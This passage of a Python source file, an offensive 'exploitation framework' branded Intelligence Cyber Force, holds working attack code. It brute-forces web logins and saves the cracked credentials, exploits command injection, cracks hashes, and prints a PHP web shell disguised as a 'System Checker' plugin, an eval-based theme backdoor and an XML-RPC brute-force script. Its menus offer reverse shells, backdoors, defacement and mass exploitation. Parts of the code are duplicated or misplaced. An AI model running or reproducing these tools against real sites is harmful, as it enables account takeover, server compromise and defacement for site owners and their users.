                    if any(x in name.lower() for x in ['user', 'email', 'login', 'username']):
                        data[name] = username
                    elif any(x in name.lower() for x in ['pass', 'pwd', 'password']):
                        data[name] = password
                    elif inp_type != 'submit':
                        data[name] = inp.get('value', '')
                
                try:
                    if method == 'post':
                        resp = self.session.post(target, data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(target, params=data, timeout=self.timeout)
                    
                    # Check success indicators
                    success = ['dashboard', 'welcome', 'logout', 'profile', 'home', 'admin panel', 'logged in']
                    fail = ['invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied']
                    
                    if any(s in resp.text.lower() for s in success) and \
                       not any(f in resp.text.lower() for f in fail):
                        elapsed = time.time() - start_time
                        print(f"\n\n{Fore.GREEN}{'='*70}")
                        print(f"{Fore.GREEN}[+] SUCCESS! Credentials found!")
                        print(f"{Fore.GREEN}[+] Username: {username}")
                        print(f"{Fore.GREEN}[+] Password: {password}")
                        print(f"{Fore.GREEN}[+] Time taken: {elapsed:.2f} seconds")
                        print(f"{Fore.GREEN}[+] Attempts: {tested}/{total}")
                        print(f"{Fore.GREEN}{'='*70}\n")
                        
                        # Save credentials
                        if self.config['save_results']:
                            try:
                                with open('cracked_credentials.txt', 'a') as f:
                                    f.write(f"{vuln['url']}\n")
                                    f.write(f"Username: {username}\n")
                                    f.write(f"Password: {password}\n")
                                    f.write(f"Date: {datetime.now()}\n")
                                    f.write("-" * 50 + "\n")
                                print(f"{Fore.GREEN}[+] Credentials saved to: cracked_credentials.txt")
                            except:
                                pass
                        
                        return True
                    
                    time.sleep(0.3)
                    
                except requests.exceptions.Timeout:
                    continue
                except requests.exceptions.ConnectionError:
                    time.sleep(2)
                    continue
                except Exception as e:
                    continue
            
            elapsed = time.time() - start_time
            print(f"\n\n{Fore.RED}{'='*70}")
            print(f"{Fore.RED}[-] Brute force completed - No valid credentials found")
            print(f"{Fore.RED}[-] Tested: {tested} combinations")
            print(f"{Fore.RED}[-] Time: {elapsed:.2f} seconds")
            print(f"{Fore.RED}{'='*70}\n")
            return False
            
        except Exception as e:
            print(f"\n{Fore.RED}[-] Error: {str(e)}")
            return False
        """Exploit Command Injection"""
        print(f"\n{Fore.CYAN}[*] Exploiting Command Injection...")
        
        commands = [
            'whoami',
            'id',
            'pwd',
            'uname -a',
            'cat /etc/passwd',
            'ls -la'
        ]
        
        for cmd in commands:
            test_url = vuln['url'].replace(vuln['payload'], quote(cmd))
            
            try:
                resp = self.session.get(test_url, timeout=10)
                
                # Check if command executed
                if any(x in resp.text.lower() for x in ['root', 'uid=', 'linux', 'www-data']):
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] COMMAND INJECTION SUCCESS!")
                    print(f"{Fore.GREEN}[+] Command: {cmd}")
                    print(f"{Fore.GREEN}{'='*60}\n")
                    print(f"{Fore.CYAN}[*] Output:")
                    print(f"{Fore.YELLOW}{resp.text[:500]}\n")
                    return True
            except:
                pass
        
        print(f"{Fore.RED}[-] Command injection exploitation failed")
        return False
    
    def manual_exploit_mode(self, exploitable):
        """Manual vulnerability selection mode"""
        
    def manual_exploit_mode(self, exploitable):
        """Manual vulnerability selection mode"""
        while True:
            print(f"\n{Fore.GREEN}Exploitable Vulnerabilities:")
            print(f"{Fore.CYAN}{'-'*70}")
            
            for i, vuln in enumerate(exploitable, 1):
                color = Fore.RED if vuln['severity'] == 'CRITICAL' else Fore.YELLOW
                print(f"{color}[{i}] {vuln['type']} - {vuln['severity']}")
                print(f"    {vuln['url'][:80]}")
            
            print(f"{Fore.CYAN}{'-'*70}")
            print(f"{Fore.GREEN}[0] Exit")
            print(f"{Fore.GREEN}[R] Rescan")
            print(f"{Fore.GREEN}[S] Save Report")
            
            try:
                choice = input(f"\n{Fore.YELLOW}Select option: ").strip().upper()
                
                if choice == '0':
                    print(f"{Fore.CYAN}[*] Exiting...")
                    break
                elif choice == 'R':
                    print(f"{Fore.CYAN}[*] Rescanning...")
                    self.scan()
                    return
                elif choice == 'S':
                    report = self.generate_report()
                    self.save_report(report)
                    continue
                
                idx = int(choice) - 1
                if 0 <= idx < len(exploitable):
                    success = self.exploit_vulnerability(exploitable[idx])
                    
                    if success:
                        print(f"\n{Fore.GREEN}{'='*70}")
                        print(f"{Fore.GREEN}[+] EXPLOITATION SUCCESSFUL!")
                        print(f"{Fore.GREEN}{'='*70}")
                    else:
                        print(f"\n{Fore.RED}{'='*70}")
                        print(f"{Fore.RED}[-] Exploitation failed")
                        print(f"{Fore.RED}{'='*70}")
                    
                    input(f"\n{Fore.CYAN}Press Enter to continue...")
                else:
                    print(f"{Fore.RED}[-] Invalid choice!")
            except ValueError:
                print(f"{Fore.RED}[-] Invalid input!")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Interrupted. Returning to menu...")
                time.sleep(1)
    
    def scan(self):
        """Main scanning function"""
        # Print banner directly
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗     ║
║    ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝     ║
║    ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║          ║
║    ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║          ║
║    ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗     ║
║    ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ║
║                                                              ║
║    Professional Vulnerability Scanner v3.0                  ║
║    Target: {self.target[:40]:<40} ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(banner)
        
        # Configure global settings before scan
        print(f"{Fore.YELLOW}[?] Configure global exploitation settings? (recommended)")
        configure = input(f"{Fore.GREEN}(y/n, default: y): ").strip().lower() or 'y'
        
        if configure == 'y':
            if not self.configure_global_settings():
                print(f"{Fore.RED}[-] Configuration cancelled")
                return
        else:
            print(f"{Fore.YELLOW}[*] Using default configuration")
        
        print(f"\n{Fore.CYAN}[*] Starting comprehensive scan...")
        print(f"{Fore.CYAN}[*] This may take several minutes...\n")
        
        # Phase 1: Reconnaissance
        print(f"{Fore.MAGENTA}{'='*70}")
        print(f"{Fore.MAGENTA}PHASE 1: RECONNAISSANCE")
        print(f"{Fore.MAGENTA}{'='*70}")
        
        self.detect_waf()
        
        # Try Cloudflare bypass
        if 'cloudflare' in str(self.detect_waf()).lower():
            self.find_cloudflare_origin()
        
        self.detect_technology()
        self.scan_ports()
        self.find_subdomains()
        
        # Phase 2: Crawling
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"{Fore.MAGENTA}PHASE 2: CRAWLING & MAPPING")
        print(f"{Fore.MAGENTA}{'='*70}")
        
        urls, forms = self.crawl_site()
        
        # Phase 3: Vulnerability Testing
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"{Fore.MAGENTA}PHASE 3: VULNERABILITY TESTING")
        print(f"{Fore.MAGENTA}{'='*70}")
        
        self.test_sql_injection(urls)
        self.test_xss(forms)
        self.test_lfi_rfi(urls)
        self.test_command_injection(urls)
        self.test_open_redirect(urls)
        self.test_csrf(forms)
        self.test_file_upload(forms)
        self.find_admin_panels()
        
        # WordPress specific tests
        if 'WordPress' in self.technologies:
            self.test_wordpress_vulnerabilities()
        
        # Phase 4: Reporting
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"{Fore.MAGENTA}PHASE 4: GENERATING REPORT")
        print(f"{Fore.MAGENTA}{'='*70}")
        
        report = self.generate_report()
        print(report)
        
        # Auto-save or ask
        if self.config['save_results']:
            self.save_report(report)
        else:
            try:
                save = input(f"\n{Fore.GREEN}Save report to file? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_report(report)
            except:
                pass
        
        # Interactive exploitation
        if self.vulnerabilities:
            self.interactive_mode()
        
        # Generate professional HTML report
        if self.config['save_results']:
            self.generate_professional_report()
        
        # Final summary
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          SCAN COMPLETE                                     ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[*] Exploited URLs: {len(self.exploited_urls)}")
        print(f"{Fore.YELLOW}[*] Compromised Credentials: {len(self.compromised_credentials)}")
        print(f"{Fore.YELLOW}[*] Uploaded Shells: {len(self.uploaded_shells)}\n")


def print_main_menu():
    """Print main menu"""
    menu = f"""
{Fore.RED}    0101010      0101010     010                                     
   010101010101010101010  010 10                                    
   010 v:43 01010101010101  010                                    
   010     010101010101010101010                                    
   010    01010101010101   0101                                  
   0     0101010 010101010101010                                  
  010   01010 0101 01010   010101 01                                 
 010  01010 010101 0101010  010101010                                
010  01010  010101  010101010101010                                
0 10  01010 010 0101010101010101010                               
 010 01010  010  0101010  010101     010                              
 010  01010   010     010  01010101 0101                              
 010 010101   010   010    010101010101                              
 010  01010 0                01 0   010                               
 010 {Fore.GREEN}Intelligence Cyber Force (ICF){Fore.RED} 010                                                                        
 010   010101010             0     0                                  
  0     01 01010             01  01                                
     0   01 01010       01  010   0                                   
     010      0101      010101010101                                  
      0101       01     010101010101                                  
       0101010             0101010 0                                  
         01010      01       01                                      
          01010101010    01                                          
            01010101   010                                          
              01 0101  01                                            
                010                                                 
               0                                                                                               
{Fore.GREEN} ___  _   _  _____  ___  ____  _    _    __    ____ 
 / __)( )_( )(  _  )/ __)(_  _)( \\/\\/ )  /__\\  (  _ \\
( (_-. ) _ (  )(_)( \\__ \\  )(   )    (  /(__)\\  )   /
 \\___/(_) (_)(_____)(___/ (__) (__/\\__)(__)(__)(_)\\_)  

{Fore.CYAN}════════════════════════════════════════════════════════════════
{Fore.YELLOW}              MAIN MENU - EXPLOITATION FRAMEWORK
{Fore.CYAN}════════════════════════════════════════════════════════════════

{Fore.GREEN}[1] Full Scan (Recommended)
{Fore.GREEN}[2] Quick Scan (Fast, basic checks)
{Fore.GREEN}[3] Custom Scan (Select tests)
{Fore.GREEN}[4] Brute Force Attack (Manual target)
{Fore.GREEN}[5] Create Wordlist
{Fore.GREEN}[6] Exploit Tools
{Fore.GREEN}[0] Exit

{Fore.CYAN}════════════════════════════════════════════════════════════════
{Style.RESET_ALL}"""
    print(menu)


def exploit_tools_menu():
    """Exploitation tools submenu"""
    while True:
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          EXPLOITATION TOOLS                                ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.GREEN}[1] Reverse Shell Generator")
        print(f"{Fore.GREEN}[2] Backdoor Generator")
        print(f"{Fore.GREEN}[3] Hash Cracker (Dictionary Attack)")
        print(f"{Fore.GREEN}[4] WordPress Exploit Pack")
        print(f"{Fore.GREEN}[5] Privilege Escalation Checker")
        print(f"{Fore.GREEN}[6] Auto Admin Account Creator")
        print(f"{Fore.GREEN}[7] Malicious Plugin Generator")
        print(f"{Fore.GREEN}[8] Website Defacer")
        print(f"{Fore.GREEN}[9] Email Harvester")
        print(f"{Fore.GREEN}[10] Interactive Shell Commander")
        print(f"{Fore.GREEN}[11] Mass URL Exploiter")
        print(f"{Fore.GREEN}[0] Back to Main Menu")
        
        choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
        
        if choice == '0':
            break
        elif choice == '1':
            scanner = AdvancedScanner("http://localhost")
            scanner.generate_reverse_shell()
        elif choice == '2':
            scanner = AdvancedScanner("http://localhost")
            scanner.generate_backdoor()
        elif choice == '3':
            hash_cracker()
        elif choice == '4':
            wordpress_exploit_pack()
        elif choice == '5':
            privilege_escalation_check()
        elif choice == '6':
            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
            if target:
                scanner = AdvancedScanner(target)
                # Need SQL injection vuln
                vuln = {'url': target, 'payload': ''}
                scanner.auto_create_admin_account(vuln)
        elif choice == '7':
            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
            if target:
                scanner = AdvancedScanner(target)
                scanner.auto_install_malicious_plugin()
        elif choice == '8':
            shell_url = input(f"\n{Fore.YELLOW}Enter shell URL: ").strip()
            if shell_url:
                scanner = AdvancedScanner("http://localhost")
                scanner.auto_deface_website(shell_url)
        elif choice == '9':
            target = input(f"\n{Fore.YELLOW}Enter target URL: ").strip()
            if target:
                scanner = AdvancedScanner(target)
                urls, _ = scanner.crawl_site(max_pages=30)
                scanner.extract_all_emails(urls)
        elif choice == '10':
            shell_url = input(f"\n{Fore.YELLOW}Enter shell URL: ").strip()
            if shell_url:
                scanner = AdvancedScanner("http://localhost")
                scanner.interactive_shell_commander(shell_url)
        elif choice == '11':
            url_file = input(f"\n{Fore.YELLOW}Enter URL list file: ").strip() or 'urls.txt'
            scanner = AdvancedScanner("http://localhost")
            scanner.mass_exploit_urls(url_file)
        else:
            print(f"{Fore.RED}[-] Invalid choice!")
        
        input(f"\n{Fore.CYAN}Press Enter to continue...")


def hash_cracker():
    """Dictionary attack on hashes"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║          HASH CRACKER                                      ║")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
    
    print(f"{Fore.YELLOW}[*] Supported formats:")
    print(f"{Fore.GREEN}  • MD5")
    print(f"{Fore.GREEN}  • SHA1")
    print(f"{Fore.GREEN}  • WordPress ($P$)")
    print(f"{Fore.GREEN}  • bcrypt ($2y$)")
    
    hash_input = input(f"\n{Fore.YELLOW}Enter hash: ").strip()
    wordlist = input(f"{Fore.YELLOW}Enter wordlist path: ").strip()
    
    if not hash_input or not wordlist:
        print(f"{Fore.RED}[-] Invalid input")
        return
    
    print(f"\n{Fore.CYAN}[*] Cracking hash...")
    print(f"{Fore.YELLOW}[*] This may take a while...\n")
    
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            for i, password in enumerate(f, 1):
                password = password.strip()
                
                # Try different hash types
                import hashlib
                
                md5_hash = hashlib.md5(password.encode()).hexdigest()
                sha1_hash = hashlib.sha1(password.encode()).hexdigest()
                
                if hash_input == md5_hash or hash_input == sha1_hash:
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] HASH CRACKED!")
                    print(f"{Fore.GREEN}{'='*60}")
                    print(f"{Fore.CYAN}Hash: {hash_input}")
                    print(f"{Fore.CYAN}Password: {password}")
                    print(f"{Fore.GREEN}{'='*60}\n")
                    return
                
                if i % 1000 == 0:
                    print(f"{Fore.CYAN}[*] Tested {i} passwords...", end='\r')
        
        print(f"\n{Fore.RED}[-] Hash not cracked with provided wordlist")
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist not found")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}")


def wordpress_exploit_pack():
    """WordPress specific exploits"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║          WORDPRESS EXPLOIT PACK                            ║")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
    
    print(f"{Fore.GREEN}[1] XML-RPC Brute Force")
    print(f"{Fore.GREEN}[2] Plugin Upload Shell")
    print(f"{Fore.GREEN}[3] Theme Editor Exploit")
    print(f"{Fore.GREEN}[4] wp-config.php Finder")
    print(f"{Fore.GREEN}[5] User Enumeration")
    
    choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
    
    if choice == '1':
        print(f"\n{Fore.CYAN}[*] XML-RPC Brute Force Attack\n")
        print(f"{Fore.YELLOW}[*] XML-RPC allows multiple login attempts in one request")
        print(f"{Fore.YELLOW}[*] This bypasses rate limiting!\n")
        
        print(f"{Fore.GREEN}Python script:")
        print(f"{Fore.CYAN}")
        print('''import requests

url = "http://target.com/xmlrpc.php"
usernames = ["admin", "administrator"]
passwords = open("passwords.txt").read().splitlines()

for user in usernames:
    for pwd in passwords:
        xml = f"""<?xml version="1.0"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{user}</string></value></param>
                <param><value><string>{pwd}</string></value></param>
            </params>
        </methodCall>"""
        
        r = requests.post(url, data=xml)
        if "isAdmin" in r.text:
            print(f"[+] Found: {user}:{pwd}")
            break''')
    
    elif choice == '2':
        print(f"\n{Fore.CYAN}[*] Malicious Plugin Generator\n")
        
        plugin_code = '''<?php
/*
Plugin Name: System Checker
Description: Checks system integrity
Version: 1.0
Author: Security Team
*/

if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>'''
        
        print(f"{Fore.GREEN}[+] Plugin code:")
        print(f"{Fore.CYAN}{plugin_code}\n")
        
        print(f"{Fore.YELLOW}[*] Steps:")
        print(f"{Fore.GREEN}1. Save as system-checker.php")
        print(f"{Fore.GREEN}2. ZIP the file")
        print(f"{Fore.GREEN}3. Upload via Plugins → Add New")
        print(f"{Fore.GREEN}4. Activate plugin")
        print(f"{Fore.GREEN}5. Access: http://target.com/wp-content/plugins/system-checker/system-checker.php?cmd=whoami")
    
    elif choice == '3':
        print(f"\n{Fore.CYAN}[*] Theme Editor Shell Injection\n")
        print(f"{Fore.YELLOW}[*] If theme editor is accessible, inject shell code\n")
        
        print(f"{Fore.GREEN}[+] Add to 404.php or footer.php:")
        print(f"{Fore.CYAN}")
        print('''<?php
if(isset($_GET['x'])){
    eval(base64_decode($_GET['x']));
}
?>''')
        print(f"\n{Fore.YELLOW}[*] Access: http://target.com/wp-content/themes/active-theme/404.php?x=base64_command")
    
    elif choice == '4':
        print(f"\n{Fore.CYAN}[*] wp-config.php Backup Finder\n")
        print(f"{Fore.YELLOW}[*] Common backup locations:\n")
        
        paths = [
            "/wp-config.php.bak",
            "/wp-config.php~",
            "/wp-config.php.save",
            "/wp-config.php.old",
            "/wp-config.txt",
            "/.wp-config.php.swp",
            "/wp-config.php_bak"
        ]
        
        for path in paths:
            print(f"{Fore.GREEN}  • http://target.com{path}")
    
    elif choice == '5':
        print(f"\n{Fore.CYAN}[*] WordPress User Enumeration\n")
        print(f"{Fore.YELLOW}[*] Methods:\n")
        
        print(f"{Fore.GREEN}1. Author archive:")
        print(f"{Fore.CYAN}   http://target.com/?author=1")
        print(f"{Fore.CYAN}   http://target.com/?author=2\n")
        
        print(f"{Fore.GREEN}2. REST API:")
        print(f"{Fore.CYAN}   http://target.com/wp-json/wp/v2/users\n")
        
        print(f"{Fore.GREEN}3. Login error messages:")
        print(f"{Fore.CYAN}   Invalid username = user doesn't exist")
        print(f"{Fore.CYAN}   Wrong password = user exists")


def privilege_escalation_check():
    """Check for privilege escalation vectors"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║          PRIVILEGE ESCALATION CHECKER                      ║")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
    
    print(f"{Fore.YELLOW}[*] Common privilege escalation vectors:\n")
    
    checks = {
        'SUID Binaries': 'find / -perm -4000 -type f 2>/dev/null',
        'Writable /etc/passwd': 'ls -la /etc/passwd',
        'Sudo privileges': 'sudo -l',
        'Cron jobs': 'cat /etc/crontab',
        'Running processes': 'ps aux | grep root',
        'Kernel version': 'uname -a',
        'Capabilities': 'getcap -r / 2>/dev/null'
    }
    
    for check, command in checks.items():
        print(f"{Fore.GREEN}[{check}]")
        print(f"{Fore.CYAN}Command: {command}\n")
    
    print(f"{Fore.YELLOW}[*] Run LinPEAS for automated check:")
    print(f"{Fore.CYAN}curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")


def create_wordlist():
    """Create custom wordlist"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}           WORDLIST GENERATOR")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    print(f"{Fore.YELLOW}[?] What type of wordlist?")
    print(f"{Fore.GREEN}[1] Username list")
    print(f"{Fore.GREEN}[2] Password list")
    print(f"{Fore.GREEN}[3] Combined list")
    
    choice = input(f"{Fore.YELLOW}Choice: ").strip()
    
    if choice == '1':
        filename = input(f"\n{Fore.YELLOW}Enter filename (e.g., usernames.txt): ").strip()
        print(f"{Fore.CYAN}[*] Enter usernames (one per line, empty line to finish):")
        
        users = []
        while True:
            user = input(f"{Fore.GREEN}> ").strip()
            if not user:
                break
            users.append(user)
        
        if users:
            try:
                with open(filename, 'w') as f:
                    f.write('\n'.join(users))
                print(f"{Fore.GREEN}[+] Saved {len(users)} usernames to {filename}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}")
        else:
            print(f"{Fore.RED}[-] No usernames entered")
    
    elif choice == '2':
        filename = input(f"\n{Fore.YELLOW}Enter filename (e.g., passwords.txt): ").strip()
        print(f"{Fore.CYAN}[*] Enter passwords (one per line, empty line to finish):")
        
        passwords = []
        while True:
            pwd = input(f"{Fore.GREEN}> ").strip()
            if not pwd:
                break
            passwords.append(pwd)
        
        if passwords:
            try:
                with open(filename, 'w') as f:
                    f.write('\n'.join(passwords))
                print(f"{Fore.GREEN}[+] Saved {len(passwords)} passwords to {filename}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}")
        else:
            print(f"{Fore.RED}[-] No passwords entered")
    
    elif choice == '3':
        user_file = input(f"\n{Fore.YELLOW}Enter username filename: ").strip()
        pass_file = input(f"{Fore.YELLOW}Enter password filename: ").strip()
        
        print(f"\n{Fore.CYAN}[*] Enter data in format: username:password")
        print(f"{Fore.CYAN}[*] Empty line to finish:")
        
        users = []
        passwords = []
        
        while True:
            entry = input(f"{Fore.GREEN}> ").strip()
            if not entry:
                break
            if ':' in entry:
                u, p = entry.split(':', 1)
                users.append(u)
                passwords.append(p)
            else:
                print(f"{Fore.RED}[-] Invalid format, use: username:password")
        
        try:
            with open(user_file, 'w') as f:
                f.write('\n'.join(users))
            with open(pass_file, 'w') as f:
                f.write('\n'.join(passwords))
            print(f"{Fore.GREEN}[+] Saved to {user_file} and {pass_file}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")


def manual_brute_force():
    """Manual brute force attack"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}           MANUAL BRUTE FORCE ATTACK")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    target = input(f"{Fore.YELLOW}Enter target login URL: ").strip()
    
    if not target:
        print(f"{Fore.RED}[-] Invalid URL!")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    print(f"\n{Fore.YELLOW}⚠️  WARNING: Use only on websites you own or have permission!")
    confirm = input(f"{Fore.YELLOW}Continue? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print(f"{Fore.RED}[-] Attack cancelled")
        return
    
    # Create scanner instance
    scanner = AdvancedScanner(target)
    
    # Create vulnerability object for brute force
    vuln = {
        'type': 'Manual Brute Force',
        'url': target,
        'severity': 'INFO'
    }
    
    # Start brute force with custom wordlists
    scanner.brute_force_login(vuln)


def quick_scan(target):
    """Quick scan with basic tests"""
    scanner = AdvancedScanner(target)
    scanner.print_banner()
    
    print(f"{Fore.YELLOW}[*] Quick Scan Mode - Basic checks only\n")
    
    urls, forms = scanner.crawl_site(max_pages=30)
    scanner.test_sql_injection(urls[:20])
    scanner.test_xss(forms[:10])
    scanner.find_admin_panels()
    
    report = scanner.generate_report()
    print(report)
    
    if scanner.vulnerabilities:
        scanner.interactive_mode()


def custom_scan(target):
    """Custom scan with user-selected tests"""
    scanner = AdvancedScanner(target)
    scanner.print_banner()
    
    print(f"\n{Fore.CYAN}Select tests to run:")
    print(f"{Fore.GREEN}[1] SQL Injection")
    print(f"{Fore.GREEN}[2] XSS")
    print(f"{Fore.GREEN}[3] LFI/RFI")
    print(f"{Fore.GREEN}[4] Command Injection")
    print(f"{Fore.GREEN}[5] Open Redirect")
    print(f"{Fore.GREEN}[6] Admin Panel Finder")
    print(f"{Fore.GREEN}[7] Port Scanner")
    print(f"{Fore.GREEN}[8] Subdomain Enumeration")
    print(f"{Fore.GREEN}[A] All Tests")
    
    choices = input(f"\n{Fore.YELLOW}Enter test numbers (e.g., 1,2,3 or A): ").strip().upper()
    
    if 'A' in choices:
        scanner.scan()
        return
    
    print(f"\n{Fore.YELLOW}[*] Starting custom scan...\n")
    
    urls, forms = scanner.crawl_site(max_pages=50)
    
    if '1' in choices:
        scanner.test_sql_injection(urls)
    if '2' in choices:
        scanner.test_xss(forms)
    if '3' in choices:
        scanner.test_lfi_rfi(urls)
    if '4' in choices:
        scanner.test_command_injection(urls)
    if '5' in choices:
        scanner.test_open_redirect(urls)
    if '6' in choices:
        scanner.find_admin_panels()
    if '7' in choices:
        scanner.scan_ports()
    if '8' in choices:
        scanner.find_subdomains()
    
    report = scanner.generate_report()
    print(report)
    
    if scanner.vulnerabilities:
        scanner.interactive_mode()


def main():
    """Main program"""
    try:
        while True:
            print_main_menu()
            
            choice = input(f"{Fore.YELLOW}Enter choice: ").strip()
            
            if choice == '0':
                print(f"{Fore.CYAN}[*] Exiting... Goodbye!")
                sys.exit(0)
            
            if choice in ['1', '2', '3']:
                target = input(f"\n{Fore.GREEN}Enter target URL: ").strip()
                
                if not target:
                    print(f"{Fore.RED}[-] Invalid URL!")
                    continue
                
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target
                
                print(f"\n{Fore.YELLOW}⚠️  WARNING: Use only on websites you own or have permission to test!")
                confirm = input(f"{Fore.YELLOW}Continue? (yes/no): ").strip().lower()
                
                if confirm != 'yes':
                    print(f"{Fore.RED}[-] Scan cancelled")
                    continue
                
                if choice == '1':
                    scanner = AdvancedScanner(target)
                    scanner.scan()
                elif choice == '2':
                    quick_scan(target)
                elif choice == '3':
                    custom_scan(target)
            
            elif choice == '4':
                manual_brute_force()
            
            elif choice == '5':
                create_wordlist()
            
            elif choice == '6':
                exploit_tools_menu()
            
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...")
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Fatal error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()